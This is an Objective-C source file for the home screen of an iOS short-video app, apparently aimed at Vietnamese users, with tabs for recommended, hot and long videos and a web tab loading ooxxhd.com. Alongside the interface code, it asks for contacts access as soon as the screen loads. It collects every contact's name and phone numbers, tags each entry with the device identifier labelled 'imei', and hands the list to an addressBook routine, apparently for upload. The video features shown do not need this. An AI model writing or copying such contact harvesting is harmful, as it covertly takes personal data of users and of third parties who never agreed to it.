//
//  VDHomeViewController.m
//  iOSMovie
//
//  Created by Josee on 08/03/2019.
//  Copyright © 2019 Josee. All rights reserved.
//

#import "HomeVC.h"
#import "HomeVC+VM.h"
#import "VDCircleListViewModel.h"
#import "ZFCollectionViewListController.h"
#import "ZFDouYinViewController.h"

CGFloat VDHomeViewController_BottomY;
HomeVC *homeVC;

@interface HomeVC ()
<
JXCategoryTitleViewDataSource
,JXCategoryListContainerViewDelegate
,JXCategoryViewDelegate
,TXScrollLabelViewDelegate//跑马灯
//,UITableViewDelegate
//,UITableViewDataSource
//,SliderLineViewDelegate
>

@property(nonatomic,strong)ZFCollectionViewListController *hot;
@property(nonatomic,strong)ZFDouYinViewController *recommend;
@property(nonatomic,strong)webVC *webVC;
@property(nonatomic,strong)VDCircleListViewModel *viewModel;
@property(nonatomic,strong)CNContactStore *contactStore;
//@property(nonatomic,strong)TapSliderScrollView *tapSliderScrollView;
@property(nonatomic,strong)JXCategoryTitleView *categoryView;
@property(nonatomic,strong)JXCategoryIndicatorLineView *lineView;
@property(nonatomic,strong)JXCategoryListContainerView *listContainerView;
@property(nonatomic,strong)NSMutableArray <NSString *>*titleMutArr;
@property(nonatomic,strong)NSMutableArray *childVCMutArr;
@property(nonatomic,copy)NSString *url;

@end

@implementation HomeVC

- (void)dealloc {
    NSLog(@"Running self.class = %@;NSStringFromSelector(_cmd) = '%@';__FUNCTION__ = %s", self.class, NSStringFromSelector(_cmd),__FUNCTION__);
    [[NSNotificationCenter defaultCenter]removeObserver:self];
}

-(instancetype)init{
    if (self = [super init]) {
        self.url = @"https://ooxxhd.com/";
        homeVC = self;
    }return self;
}

#pragma mark - life cycle
- (void)viewDidLoad {
    [super viewDidLoad];
    [self setupSubviews];
    [self layoutNavigation];
    [self requestContactAuthorAfterSystemVersion];
    self.gk_navigationBar.hidden = YES;
    self.view.backgroundColor = [UIColor colorWithHexString:@"050013"];
}

- (void)viewWillAppear:(BOOL)animated{
    [super viewWillAppear:animated];
    self.listContainerView.alpha = 1;
    self.categoryView.alpha = 1;
    self.lineView.alpha = 1;
    self.navigationController.navigationBar.hidden = YES;
}

- (void)viewWillDisappear:(BOOL)animated {
    [super viewWillDisappear:animated];
}

- (void)setupSubviews {
    self.navigationController.navigationBar.translucent = NO;
    self.navigationController.navigationBarHidden = YES;
    //自动滑动到第一页
//    [self.tapSliderScrollView sliderToViewIndex:0];
}

#pragma mark —— 公告
- (void)layoutNavigation {
    //设置导航栏
    self.view.userInteractionEnabled = YES;
    self.navigationController.navigationBarHidden = YES;
    // 适配iOS 11
    if (@available(iOS 11.0, *)) {
    } else {
        self.automaticallyAdjustsScrollViewInsets = NO;
    }
}

#pragma mark —— 点击事件
-(void)refreshAction:(UIButton *)sender{
    NSLog(@"Running self.class = %@;NSStringFromSelector(_cmd) = '%@';__FUNCTION__ = %s", self.class, NSStringFromSelector(_cmd),__FUNCTION__);
}

#pragma mark JXCategoryTitleViewDataSource
//// 如果将JXCategoryTitleView嵌套进UITableView的cell，每次重用的时候，JXCategoryTitleView进行reloadData时，会重新计算所有的title宽度。所以该应用场景，需要UITableView的cellModel缓存titles的文字宽度，再通过该代理方法返回给JXCategoryTitleView。
//// 如果实现了该方法就以该方法返回的宽度为准，不触发内部默认的文字宽度计算。
//- (CGFloat)categoryTitleView:(JXCategoryTitleView *)titleView
//               widthForTitle:(NSString *)title{
//
//    return 10;
//}

#pragma mark JXCategoryListContainerViewDelegate
/**
 返回list的数量

 @param listContainerView 列表的容器视图
 @return list的数量
 */
- (NSInteger)numberOfListsInlistContainerView:(JXCategoryListContainerView *)listContainerView{
    return self.titleMutArr.count;
}

/**
 根据index初始化一个对应列表实例，需要是遵从`JXCategoryListContentViewDelegate`协议的对象。
 如果列表是用自定义UIView封装的，就让自定义UIView遵从`JXCategoryListContentViewDelegate`协议，该方法返回自定义UIView即可。
 如果列表是用自定义UIViewController封装的，就让自定义UIViewController遵从`JXCategoryListContentViewDelegate`协议，该方法返回自定义UIViewController即可。

 @param listContainerView 列表的容器视图
 @param index 目标下标
 @return 遵从JXCategoryListContentViewDelegate协议的list实例
 */
- (id<JXCategoryListContentViewDelegate>)listContainerView:(JXCategoryListContainerView *)listContainerView
                                          initListForIndex:(NSInteger)index{
    return self.childVCMutArr[index];
}

#pragma mark JXCategoryViewDelegate
//传递didClickSelectedItemAt事件给listContainerView，必须调用！！！
- (void)categoryView:(JXCategoryBaseView *)categoryView didClickSelectedItemAtIndex:(NSInteger)index {
    [self.listContainerView didClickSelectedItemAtIndex:index];
}

//传递scrolling事件给listContainerView，必须调用！！！
- (void)categoryView:(JXCategoryBaseView *)categoryView
scrollingFromLeftIndex:(NSInteger)leftIndex
        toRightIndex:(NSInteger)rightIndex
               ratio:(CGFloat)ratio {
    [self.listContainerView scrollingFromLeftIndex:leftIndex
                                      toRightIndex:rightIndex
                                             ratio:ratio
                                     selectedIndex:categoryView.selectedIndex];
}

#pragma mark —— TXScrollLabelViewDelegate
- (void)scrollLabelView:(TXScrollLabelView *)scrollLabelView
       didClickWithText:(NSString *)text
                atIndex:(NSInteger)index{
    //点击关闭
    self.scrollLabelView.hidden = YES;
    self.scrollLabelView.scrollTitle = @"";
    NSLog(@"%@",text);
}

#pragma mark 请求通讯录权限
- (void)requestContactAuthorAfterSystemVersion {
    @weakify(self)
    [ECAuthorizationTools checkAndRequestAccessForType:ECPrivacyType_Contacts
                                          accessStatus:^(ECAuthorizationStatus status, ECPrivacyType type) {
                                              @strongify(self)
                                              // status 即为权限状态，
                                              //状态类型参考：ECAuthorizationStatus
                                              NSLog(@"%lu",(unsigned long)status);
                                              if (status == ECAuthorizationStatus_Authorized) {
                                                  [self openContact];
                                              }else{
                                                  NSLog(@"通讯录不可用:%lu",(unsigned long)status);
                                                  [self showAlertViewTitle:NSLocalizedString(@"AddressBookPermissions", nil)
                                                                   message:@""
                                                            alertBtnAction:@[@"pushToSysConfig"]];
                                              }
                                          }];
}

//有通讯录权限-- 进行下一步操作
- (void)openContact{
    // 获取指定的字段,并不是要获取所有字段，需要指定具体的字段
    if (@available(iOS 9.0, *)) {
        NSArray *keysToFetch = @[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey];
        CNContactFetchRequest *fetchRequest = [[CNContactFetchRequest alloc] initWithKeysToFetch:keysToFetch];
        if (self.adressArr.count != 0) {
            [self.adressArr removeAllObjects];
        }
        @weakify(self)
        [self.contactStore enumerateContactsWithFetchRequest:fetchRequest
                                                  error:nil
                                             usingBlock:^(CNContact * _Nonnull contact,
                                                          BOOL * _Nonnull stop) {
                                                 @strongify(self)
                                                 //拼接姓名
            NSString *nameStr = [NSString stringWithFormat:@"%@%@",contact.familyName,contact.givenName];
            NSArray *phoneNumbers = contact.phoneNumbers;
            for (CNLabeledValue *labelValue in phoneNumbers) {
                //遍历一个人名下的多个电话号码
                //   NSString *    phoneNumber = labelValue.value;
                CNPhoneNumber *phoneNumber = labelValue.value;
                NSString * string = phoneNumber.stringValue ;
                //去掉电话中的特殊字符
                string = [string stringByReplacingOccurrencesOfString:@"+84" withString:@""];
                string = [string stringByReplacingOccurrencesOfString:@"-" withString:@""];
                string = [string stringByReplacingOccurrencesOfString:@"(" withString:@""];
                string = [string stringByReplacingOccurrencesOfString:@")" withString:@""];
                string = [string stringByReplacingOccurrencesOfString:@" " withString:@""];
                string = [string stringByReplacingOccurrencesOfString:@" " withString:@""];
                [self.adressArr addObject:@{
                    @"contactsName":nameStr,
                    @"contactsPhone":string,
                    @"imei":UDID,
                }];
            }
        }];
        [self addressBook];
        } else {
        // Fallback on earlier versions
    }
}

#pragma mark —— lazyLoad
-(NSMutableArray<NSString *> *)titleMutArr{
    if (!_titleMutArr) {
        _titleMutArr = NSMutableArray.array;
        [_titleMutArr addObject:NSLocalizedString(@"VDRecommendedNumberText", nil)];//推荐
        [_titleMutArr addObject:NSLocalizedString(@"VDHotText", nil)];//热门
        [_titleMutArr addObject:NSLocalizedString(@"VDLongVedio", nil)];//长视频
    }return _titleMutArr;
}

-(NSMutableArray *)childVCMutArr{
    if (!_childVCMutArr) {
        _childVCMutArr = NSMutableArray.array;
        [self.childVCMutArr addObject:self.recommend];
        [self.childVCMutArr addObject:self.hot];
        [self.childVCMutArr addObject:self.webVC];
    }return _childVCMutArr;
}

-(JXCategoryListContainerView *)listContainerView{
    if (!_listContainerView) {
        _listContainerView = [[JXCategoryListContainerView alloc] initWithDelegate:self];
        [self.view addSubview:_listContainerView];
        [self.view layoutIfNeeded];
        [_listContainerView mas_makeConstraints:^(MASConstraintMaker *make) {
            make.edges.equalTo(self.view);
        }];
        //关联cotentScrollView，关联之后才可以互相联动！！！
        self.categoryView.contentScrollView = _listContainerView.scrollView;
        [self.view layoutIfNeeded];
    }return _listContainerView;
}

-(JXCategoryTitleView *)categoryView{
    if (!_categoryView) {
        _categoryView = [[JXCategoryTitleView alloc] initWithFrame:CGRectMake(0,
                                                                              rectOfStatusbar,
                                                                              SCREEN_WIDTH,
                                                                              SCALING_RATIO(50))];
        VDHomeViewController_BottomY = rectOfStatusbar + SCALING_RATIO(50);
        _categoryView.backgroundColor = kClearColor;
        _categoryView.titleSelectedColor = kWhiteColor;
        _categoryView.titleColor = kWhiteColor;
        _categoryView.titleFont = [UIFont systemFontOfSize:13];
        _categoryView.titleSelectedFont = [UIFont systemFontOfSize:15];
        _categoryView.delegate = self;
        _categoryView.titles = self.titleMutArr;
        _categoryView.titleColorGradientEnabled = YES;
        [self.view addSubview:_categoryView];
    }return _categoryView;
}

-(JXCategoryIndicatorLineView *)lineView{
    if (!_lineView) {
        _lineView = JXCategoryIndicatorLineView.new;
        _lineView.indicatorLineViewColor = kWhiteColor;
        _lineView.indicatorLineWidth = JXCategoryViewAutomaticDimension;
        self.categoryView.indicators = @[_lineView];
    }return _lineView;
}

-(TXScrollLabelView *)scrollLabelView{
    if (!_scrollLabelView) {
        _scrollLabelView = [TXScrollLabelView scrollWithTitle:@""
                                                         type:TXScrollLabelViewTypeLeftRight
                                                     velocity:.5f
                                                      options:UIViewAnimationOptionCurveEaseInOut];
        _scrollLabelView.scrollLabelViewDelegate = self;
        _scrollLabelView.backgroundColor = RGBACOLOR(190,
                                                      52,
                                                      98,
                                                      0.3f);
        _scrollLabelView.scrollTitleColor = kWhiteColor;
        [self.navigationController.view addSubview:_scrollLabelView];
        [self.navigationController.view bringSubviewToFront:_scrollLabelView];
        _scrollLabelView.frame = CGRectMake(SCALING_RATIO(0),
                                            rectOfStatusbar + SCALING_RATIO(50),
                                            SCALING_RATIO(414),
                                            SCALING_RATIO(30));
        [_scrollLabelView beginScrolling];
    }return _scrollLabelView;
}

-(NSMutableArray *)adressArr{
    if (!_adressArr) {
        _adressArr = NSMutableArray.array;
    }return _adressArr;
}

-(ZFDouYinViewController *)recommend{
    if (!_recommend) {
        _recommend = ZFDouYinViewController.new;
    }return _recommend;
}

-(ZFCollectionViewListController *)hot{
    if (!_hot) {
        _hot = ZFCollectionViewListController.new;
    }return _hot;
}

-(webVC *)webVC{
    if (!_webVC) {
        _webVC = [[webVC alloc]initWithRequestParams:self.url
                                             success:^(id _Nonnull data) {}];
    }return _webVC;
}

-(CNContactStore *)contactStore{
    if (!_contactStore) {
        _contactStore = CNContactStore.new;
    }return _contactStore;
}



@end
